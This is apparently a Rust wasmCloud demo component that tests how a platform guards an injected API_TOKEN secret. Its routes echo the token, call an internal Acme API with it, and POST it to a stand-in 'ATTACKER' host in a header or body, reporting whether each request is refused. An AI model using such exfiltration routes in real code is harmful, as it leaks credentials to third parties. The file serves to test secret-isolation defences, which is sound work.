use wstd::http::{Body, Client, Method, Request, Response, StatusCode};

const ACME_API: &str = "https://host.wasmcloud.internal:8443";
const ATTACKER: &str = "https://host.wasmcloud.internal:9443";

const ROUTES: &str = "\
GET /env           what this component holds in API_TOKEN
GET /whoami        call the Acme API with the token
GET /echo          the Acme API echoes the token back in a header
GET /delete        call a route the token is not granted for
GET /exfil-header  send the token to another server in a header
GET /exfil-body    send the token to another server in the body
";

#[wstd::http_server]
async fn main(req: Request<Body>) -> Result<Response<Body>, wstd::http::Error> {
    let token = std::env::var("API_TOKEN").unwrap_or_default();
    let auth = format!("Bearer {token}");
    let auth = Some(auth.as_str());
    let (method, url, auth, body) = match req.uri().path() {
        "/" => return reply(StatusCode::OK, ROUTES.to_string()),
        "/env" => return reply(StatusCode::OK, format!("API_TOKEN={token}\n")),
        "/whoami" => (Method::GET, format!("{ACME_API}/v1/whoami"), auth, ""),
        "/echo" => (Method::GET, format!("{ACME_API}/v1/echo"), auth, ""),
        "/delete" => (
            Method::DELETE,
            format!("{ACME_API}/v1/repos/demo"),
            auth,
            "",
        ),
        "/exfil-header" => (Method::POST, format!("{ATTACKER}/collect"), auth, ""),
        "/exfil-body" => (
            Method::POST,
            format!("{ATTACKER}/collect"),
            None,
            token.as_str(),
        ),
        _ => return reply(StatusCode::NOT_FOUND, ROUTES.to_string()),
    };
    reply(StatusCode::OK, send(method, &url, auth, body).await)
}

fn reply(status: StatusCode, text: String) -> Result<Response<Body>, wstd::http::Error> {
    Response::builder()
        .status(status)
        .body(text.into())
        .map_err(Into::into)
}

/// Sends one request and describes what came back, or why it never left.
async fn send(method: Method, url: &str, auth: Option<&str>, body: &str) -> String {
    let mut request = Request::builder().method(method.clone()).uri(url);
    if let Some(auth) = auth {
        request = request.header("authorization", auth);
    }
    let request = match request.body(Body::from(body.to_string())) {
        Ok(request) => request,
        Err(err) => return format!("could not build the request: {err}\n"),
    };
    let mut response = match Client::new().send(request).await {
        Ok(response) => response,
        Err(err) => return format!("{method} {url}\n  refused: {err:?}\n"),
    };
    let echoed = response
        .headers()
        .get("x-echo-authorization")
        .and_then(|v| v.to_str().ok())
        .map(|v| format!("  x-echo-authorization: {v}\n"))
        .unwrap_or_default();
    let status = response.status();
    let body = match response.body_mut().str_contents().await {
        Ok(body) => body.trim_end().to_string(),
        Err(err) => format!("unreadable body: {err}"),
    };
    format!("{method} {url}\n  {status}\n{echoed}  {body}\n")
}
